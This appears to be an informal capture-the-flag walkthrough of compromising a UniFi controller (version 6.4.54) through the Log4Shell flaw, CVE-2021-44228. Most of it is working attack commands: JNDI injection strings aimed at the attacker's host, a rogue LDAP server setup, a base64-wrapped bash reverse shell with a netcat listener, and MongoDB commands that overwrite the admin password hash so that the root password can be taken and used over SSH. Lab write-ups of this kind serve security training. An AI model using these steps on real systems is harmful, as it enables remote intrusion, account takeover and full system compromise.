scanning this box identified multiple ports,
going to the website 1 stood out,
8080 redirected to 8443

this was a login with a unify admin page with version 6.4.54,
searching for exploits for this version,
found an cve: CVE-2021-44228

capturing a login request
and tryign a payload to see if it works
${jndi:ldap://{hack_box_ip}/whatever}

capturing with `tcpdump -i tun0 port 389` showed us we got an ldap request from the box
and in burp we see `api.err.InvalidPayload`

with the cve there was an exploit, setting it up:
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package

this launches some rogue ldap server,
abusing a log4j vulnerability

the_hash=$(echo 'bash -c "bash -i >& /dev/tcp/{hack_box_ipp}/4444 0>&1"' | base64)
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,$the_hash}|
{base64,-d}|{bash,-i}" --hostname "{hack_box_ip}"

altough the payloads setsup a reverse shell,
we still need to launch our listener:
nc -lvp 4444

going back to burpsuite,
and sending the next payload:
${jndi:ldap://{hack_box_ip}:1389/o=tomcat}

after this primitive shell
lets run a better shell:
script /dev/null -c bash

ls /home
ls /home/michael
cat /home/michael/user.txt


after this we have acces to the user,
but we need to escalate to root,
and we find a mongodb running:
ps aux | grep mongo

using the following commands to find and replace passwords:

with this we find the admin user and its details:
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"

this will get us a new password hash
and should be run in our own shell:
mkpasswd -m sha-512 Password1234

and then we can update the password hash:
mongo --port 27117 ace --eval 'db.admin.update({"_id": {administrator_id}},{$set:{"x_shadow":"{new_password_hash}"}})'

and use administrator:Password1234 to login on the site
after loging in we can find the root password in settings>site


and login with root:{found_password} with ssh and get the root flag